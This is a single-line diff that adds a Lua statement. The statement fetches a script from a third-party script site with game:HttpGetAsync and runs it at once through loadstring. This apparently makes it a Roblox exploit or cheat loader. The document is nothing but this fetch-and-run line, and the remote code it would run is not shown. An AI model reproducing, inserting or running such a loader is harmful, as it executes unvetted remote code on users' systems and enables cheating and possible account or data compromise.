@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
